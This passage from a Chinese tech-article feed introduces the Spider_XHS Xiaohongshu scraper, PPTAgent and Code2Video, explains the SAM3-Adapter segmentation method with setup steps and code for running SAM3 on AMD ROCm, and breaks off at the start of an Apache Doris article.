<p>这个叫 Spider_XHS 的小红书爬虫神器，已经在 GitHub 上获得 3000 多 Star 了。</p>
<p>它不仅是一个爬虫工具，更是一套小红书全域运营的解决方案。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56cbdd4dbd734a948b43e791d560b565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=e9OlRDU%2FCyJvj64d9Ndse2iJygg%3D" alt="图片" loading="lazy"/></p>
<p>这个开源的小红书数据采集开源项目支持多种维度的数据抓取，能够将数据保存为 Excel 表格或直接下载多媒体文件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a62d93da8524985b6615c7c91291974~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=46AmkkW6Gs6r4rg2BT7knJsaRFk%3D" alt="图片" loading="lazy"/></p>
<p>某个用户所有的小红书笔记，能保存到本地文件夹：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8f0ae47a6d04f448fa217fe9ff6b418~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=vHRBEMl8hjLOcRXTWm2eywwuu7g%3D" alt="图片" loading="lazy"/></p>
<p>每一个笔记都是按照如下这种方式保存，能自动提取并下载高清无水印图片，还能保存笔记链接、标题、点赞/收藏数据等等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d384bcbaa0cf44cbab93a33be4b43089~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=NcvcJ%2FpruilZYRWZeBiKNlF%2FRzM%3D" alt="图片" loading="lazy"/></p>
<p>除了爬之外，它还集成了创作者平台的接口，支持笔记的自动化上传，简直是运营人的效率倍增器。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4bab4e1385344da8d04e4c3802da691~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=x4BwDQ62158h9BCDh3%2FNhAMNl5U%3D" alt="图片" loading="lazy"/></p>
<p>使用该项目需要具备基础的 Python 和 Node.js 环境。</p>
<p><strong>第一步：克隆项目与安装依赖</strong></p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">下载项目git <span class="hljs-built_in">clone</span> https://github.com/cv-cat/Spider_XHS.gitcd Spider_XHS</span>
<span class="hljs-meta prompt_"># </span><span class="bash">安装 Python 依赖pip install -r requirements.txt</span>
<span class="hljs-meta prompt_"># </span><span class="bash">安装 Node.js 依赖（用于加密参数生成）npm install</span>
</code></pre>
<p><strong>第二步：配置 Cookie</strong></p>
<p>这是最关键的一步。项目根目录有一个 .env 文件，如果没有则新建一个，你需要将自己的小红书 Cookie 填入其中。</p>
<p>① 浏览器打开小红书网页版并登录。</p>
<p>② 按 F12 打开开发者工具，找到 Network (网络) 选项卡。</p>
<p>③ 刷新页面，随便点击一个请求，在 Request Headers 中找到 cookie 字段。</p>
<p>④ 将 Cookie 复制并粘贴到 .env 文件中。</p>
<p><strong>第三步：运行爬虫</strong></p>
<p>项目入口是 main.py，你可以根据需求修改代码中的调用逻辑，然后直接运行：</p>
<pre><code class="hljs language-css" lang="css">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span>
</code></pre>
<p>运行后，你会在控制台看到采集进度，采集到的数据和媒体文件会自动保存在相应的文件夹中。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/cv-cat/Spider_XHS</span>
</code></pre>
<h2 data-id="heading-1">02、PPT Agent</h2>
<p><strong>PPTAgent 是</strong>中科院计算所开源的项目。</p>
<p>它不仅能根据一句话生成PPT，还能直接读懂长文档，自动提炼重点生成幻灯片。</p>
<p>与市面上简单的文本转Markdown转PPT不同，PPTAgent 采用了一种更加智能的多智能体（Multi-Agent） 流程，模拟了人类制作 PPT 的完整思考过程。</p>
<p>比如，让这个开源项目生成一个 PPT，介绍小米 SU7 的外观和价格。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9669a44b43f4aeea3557c7c778ab07d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=jolNjpc0SIzqZQKiEWzAcs4jUl4%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c593d376f85c46318a33bf7a7633c2f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=gV%2B%2FPF3icRW8fV9f7lgHCJ0u3AE%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b647a90e06df4112b58b6f9ae4cf51b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=7aIGJNxAQyMcY%2FZSlTXdTcLnSI4%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b61bb60a958f4f74b6563bba3b103a89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=EDUaPAnwv%2FZv1%2FRDuNc9OgCyG7M%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a280c1e725054050858e4dadf31ead96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=Pr1PXrrCY7tvQXWxLuvDRix6cTY%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9195b9169d814a31952f4687f36a886c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=nHSIYOdWgW5Ddtomw%2FXZMhF9jIs%3D" alt="图片" loading="lazy"/></p>
<p>生成的 PPT 会适配不同的商务或学术风格。可以根据每页的内容，自动搜索并插入相关的图片。</p>
<p>又或者制作一份高中课堂展示课件，主题为“解码立法过程：理解其对国际关系的影响”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/009acaa08a3346a294e33ca8af4c13b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=WuIjtgFvGrUtmGTN2w7n2X8btBA%3D" alt="图片" loading="lazy"/></p>
<p>PPTAgent 支持上传本地文件，比如论文、技术报告、财报。</p>
<p>它会利用 RAG 技术，从长文中提取关键信息，确保生成的 PPT 内容准确、详实，而不是一本正经地胡说八道。</p>
<p>牛逼的是 PPTAgent 直接输出原生的 .pptx 文件，你在 PowerPoint 软件里打开就能随意修改、拖拽、美化，完全没有兼容性问题。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/icip-cas/PPTAgent</span>
</code></pre>
<h2 data-id="heading-2">03、Code2Video</h2>
<p>别再死磕 Sora 了，这个开源项目用代码生成高质量教学视频。</p>
<p>它不走寻常路，不直接生成像素，而是<strong>通过写代码（Manim）来生成视频</strong>。</p>
<p>#这意味着它生成的视频逻辑严密、清晰度满分，而且每一帧都可以精准修改。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1156cfa8b59c4837a266f753803765de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446603&amp;x-signature=LVEbE4KFV3K%2FKNbXd9o8%2FGJOzlU%3D" alt="图片" loading="lazy"/></p>
<p>简单来说，<strong>Code2Video 是一个由 AI 智能体驱动的框架，灵感来自于那个著名的数学科普大神</strong> <strong>3Blue1Brown</strong>，他背后的动画引擎就是 <strong>Manim</strong>。</p>
<p>Code2Video 相当于给你配了一个 24 小时待命的 Python 程序员，专门帮你写 Manim 代码来做动画。</p>
<p>该项目由新国立大学团队开发，刚刚获得 1K 的 Star。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/showlab/Code2Video</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何让SAM3在医学图像上比专用模型还强？一个轻量Adapter如何让它“秒变”专家？]]></title>    <link>https://juejin.cn/post/7579673620957872174</link>    <guid>https://juejin.cn/post/7579673620957872174</guid>    <pubDate>2025-12-04T08:29:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579673620957872174" data-draft-id="7579629985062748186" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何让SAM3在医学图像上比专用模型还强？一个轻量Adapter如何让它“秒变”专家？"/> <meta itemprop="keywords" content="算法,计算机视觉,深度学习"/> <meta itemprop="datePublished" content="2025-12-04T08:29:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何让SAM3在医学图像上比专用模型还强？一个轻量Adapter如何让它“秒变”专家？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:29:33.000Z" title="Thu Dec 04 2025 08:29:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Meta 实验室开源的 Segment Anything Model 3（SAM3）被誉为视觉分割领域的“终极形态”，它以“一个模型，搞定一切视觉识别任务”为口号，确实在自然图像的零样本分割能力上达到了新高度。</p>
<p>无论是通过文本提示还是视觉提示，SAM3 都能在图像和视频中检测、分割和跟踪所有匹配对象。</p>
<p>然而，正如所有通用模型的宿命，当面对某些专业领域任务时，SAM3 的表现开始出现裂痕。</p>
<h2 data-id="heading-0"><strong>通用之困</strong></h2>
<p>在目标与背景高度融合的<strong>阴影检测、伪装目标检测</strong>任务中，SAM3 的分割边缘经常直接崩溃。</p>
<p>在需要极致精细边界的医学图像分析中，它要么漏掉微小病灶，要么将普通噪声误判为肿瘤组织。</p>
<p>这种表现差距的根源在于：<strong>训练数据无法覆盖全部应用场景。</strong></p>
<p>当工作环境发生变化，领域知识出现鸿沟时，通用大模型就会显露出它的局限性。难道这意味着像 SAM3 这样的通用视觉大模型真的无法胜任专业任务吗？</p>
<p>来自 KOKONI 的研究团队发现了一个惊人事实：<strong>不是 SAM3 不够强，而是我们解锁它的方式不对。</strong></p>
<p>研究焦点从“如何修复模型局限性”转向“如何为模型充分解锁零样本能力”。他们提出的解决方案既优雅又高效——<strong>SAM3-Adapter</strong>。</p>
<h2 data-id="heading-1"><strong>SAM3-Adapter</strong></h2>
<p>直接对拥有百亿参数的 SAM3 进行全量微调？这不仅计算资源消耗巨大，还需要为每个下游任务训练完整模型，更可能遭遇灾难性遗忘问题。</p>
<p>受 NLP 领域适配器技术的启发，研究团队提出了首个为 SAM3 量身定制的适配器框架。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eec25d8861cd4dcbaded18e3cb29deb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441773&amp;x-signature=ah2xbqP732MtWfYb1748svkJnuI%3D" alt="screenshot_2025-12-04_15-38-23.png" loading="lazy"/></p>
<p><strong>SAM3-Adapter 的设计哲学是简单而强大：</strong></p>
<p>其架构极简，仅由两个 MLP 层和一个激活函数构成，参数量仅为 200-500 万，是 SAM3 参数量的 1/2000。</p>
<p>它通过视觉提示将领域知识传递到 SAM3 的每个 Transformer 层，无需改变 SAM3 原有参数，从根本上避免灾难性遗忘。</p>
<p>仅需少量标注数据即可快速适应新任务，并且可以同时挂载多个 Adapter，灵活组合以满足多样化的任务需求。</p>
<h2 data-id="heading-2"><strong>核心技术实现</strong></h2>
<p>SAM3-Adapter 的核心思想是<strong>冻结 SAM3 的 Image Encoder，只训练 Mask Decoder，</strong> 从而实现高效的领域迁移。</p>
<p>这种 Adapter 范式非常适合于低资源场景下的领域迁移，能够以较小的计算代价将通用分割模型适配到特定任务。</p>
<p>下面是使用 SAM3-Adapter 的代码示例：</p>
<pre><code class="hljs language-ini" lang="ini">import torch
import yaml
import models

<span class="hljs-comment"># 1. 加载配置</span>
with open('configs/cod-sam-vit-l_all.yaml', 'r') as f:
    <span class="hljs-attr">config</span> = yaml.load(f, Loader=yaml.FullLoader)

<span class="hljs-comment"># 2. 构建模型</span>
<span class="hljs-attr">model</span> = models.make(config[<span class="hljs-string">'model'</span>]).cuda()

<span class="hljs-comment"># 3. 加载训练好的权重</span>
<span class="hljs-attr">checkpoint</span> = torch.load(<span class="hljs-string">'model_epoch_best.pth'</span>, map_location=<span class="hljs-string">'cuda:0'</span>)
model.load_state_dict(checkpoint, <span class="hljs-attr">strict</span>=<span class="hljs-literal">True</span>)
model.eval()

<span class="hljs-comment"># 4. 推理</span>
with torch.no_grad():
    <span class="hljs-comment"># input_image: [B, 3, 1008, 1008], 归一化到 [-1, 1]</span>
    <span class="hljs-attr">pred_logits</span> = model.infer(input_image)
    <span class="hljs-attr">pred_mask</span> = torch.sigmoid(pred_logits)  <span class="hljs-comment"># [B, 1, 1008, 1008]</span>
</code></pre>
<h2 data-id="heading-3"><strong>性能突破</strong></h2>
<p>在实际应用中，<strong>SAM3 这样的通用骨干网络，在被适配器增强后，可以超越高度专业化的模型。</strong></p>
<p>比如在医学图像息肉分割的定性结果对比中，原始 SAM 难以准确勾勒息肉边界，SAM2 甚至产生无意义输出。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e5bb062873840bebda0ebc514e6df19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441773&amp;x-signature=Uzgh1mlUkUdRqYqyIg%2FxCKJ0v9g%3D" alt="screenshot_2025-12-04_15-43-13.png" loading="lazy"/></p>
<p>虽然功能强大的 SAM3 模型能够成功定位息肉组织，但其单独分割常常导致掩膜不完整、边界模糊。</p>
<p><strong>SAM3-Adapter 显著增强了这一基础能力，</strong> 引导模型生成高度准确且全面的分割结果。</p>
<p>所得掩膜精确描绘了整个息肉结构，性能显著优于所有基线模型。这证明了“基础模型+轻量适配器”模式在专业领域的巨大潜力。</p>
<h2 data-id="heading-4"><strong>SAM3实战</strong></h2>
<p>Meta 最新推出的 SAM3 模型备受关注，但许多开发者在尝试运行该模型时遇到了挑战。</p>
<p>以下是在 AMD Ryzen AI Max+395 处理器上使用 PyTorch 和 ROCm for Windows 运行 SAM3 的实战经验：</p>
<p>首先搭建环境：</p>
<pre><code class="hljs language-bash" lang="bash">conda create --name rocm710-py312-ghhf python=3.12 
conda activate rocm710-py312-ghhf 
pip install --index-url https://rocm.nightlies.amd.com/v2/gfx1151/ <span class="hljs-string">"rocm[libraries,devel]"</span>
pip install --index-url https://rocm.nightlies.amd.com/v2/gfx1151/ --pre torch torchaudio torchvision
</code></pre>
<p>由于此版本的 ROCm 尚不完全支持 PyTorch DTensor，需要修改 Transformers 库中的一行代码：</p>
<p>编辑 transformers\src\transformers\core_model_loading.py 并注释掉第 32 行。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a808dfdfaa345d48c0c496c0b019b68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441773&amp;x-signature=2Idfab%2Fqh0%2BXEnH0FBGPOqTcJ%2FE%3D" alt="screenshot_2025-12-04_15-41-19.png" loading="lazy"/></p>
<p>安装修改后的 Transformers：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> transformers 
pip install <span class="hljs-string">'.[torch]'</span>
</code></pre>
<p>在使用 Hugging Face 的原始示例代码时，在 ROCm 上会遇到运行错误。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22c903830e3e46c68d20517b9bfd1c6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441773&amp;x-signature=VZG6tY4DSbmt35invapH6%2Bv88UA%3D" alt="screenshot_2025-12-04_15-40-56.png" loading="lazy"/></p>
<p>经过调试，发现有两种解决方案：使用 attn_implementation="eager" 或将模型转换为 float32 类型。</p>
<p>最终得到的可运行代码如下：</p>
<pre><code class="hljs language-from" lang="from">import torch 
from PIL import Image 
import requests 
import gc, sys 
import time 
import numpy as np 
import matplotlib 

def overlay_masks(image, masks): 
    # 可视化掩膜覆盖函数
    ...

device = "cuda" if torch.cuda.is_available() else "cpu"

try:
    # 解决方案1: 使用eager attention实现
    model = Sam3Model.from_pretrained("facebook/sam3", 
        attn_implementation="eager").to(device)
    processor = Sam3Processor.from_pretrained("facebook/sam3")

    image = Image.open("000000077595.jpg").convert("RGB")
    inputs = processor(images=image, text="ear", return_tensors="pt").to(device)

    with torch.no_grad():
        start_time = time.time()
        outputs = model(**inputs)
        end_time = time.time()
        print(f"推理时间：{end_time - start_time:.4f}秒")

    results = processor.post_process_instance_segmentation(
        outputs,
        threshold=0.5,
        mask_threshold=0.5,
        target_sizes=inputs.get("original_sizes").tolist()
    )[0]

    print(f"找到{len(results['masks'])}个对象")
    overlay_masks(image, results["masks"]).show()

except Exception as e:
    print(f"✗ 使用eager attention失败：{e}")
</code></pre>
<p>使用 attn_implementation="eager" 或 dtype=torch.float32 都能使 SAM3 在 ROCm 上正常运行。</p>
<p>两种方法的内存使用量相近，均低于 7 GB，而 float32 推理（14-15 秒）比 eager attention（15-16 秒）略快。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1ea18c006454ef1b105c2f7063d0c33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441773&amp;x-signature=zJ5JwZ4sCiGVqVu9MeOvaRVWy1I%3D" alt="screenshot_2025-12-04_15-41-59.png" loading="lazy"/></p>
<h2 data-id="heading-5"><strong>新生态正在形成</strong></h2>
<p>一个由 <strong>“基础模型+轻量适配器”</strong>  构成的 AI 新生态正在快速形成。</p>
<p>在这个生态中，<strong>每个人都能以最低的成本，获得最强大的AI能力。</strong> SAM3-Adapter 仅是这一趋势的开端，它展示了如何通过极简的架构修改，释放通用大模型在特定领域的全部潜力。</p>
<p>对于普通研究者和开发者而言，这意味着不再需要从头训练庞大的模型，也不再需要担心灾难性遗忘。</p>
<p>只需训练一个轻量级的适配器，就能让百亿参数的视觉大模型在专业任务上达到甚至超越专用模型的水平。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Apache Doris 实时更新全解：从设计原理到最佳实践｜Deep Dive]]></title>    <link>https://juejin.cn/post/7579800429375766578</link>    <guid>https://juejin.cn/post/7579800429375766578</guid>    <pubDate>2025-12-04T08:30:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579800429375766578" data-draft-id="7579808521203105826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Apache Doris 实时更新全解：从设计原理到最佳实践｜Deep Dive"/> <meta itemprop="keywords" content="Apache,数据库"/> <meta itemprop="datePublished" content="2025-12-04T08:30:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SelectDB"/> <meta itemprop="url" content="https://juejin.cn/user/3189021726222904"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Apache Doris 实时更新全解：从设计原理到最佳实践｜Deep Dive
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3189021726222904/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SelectDB
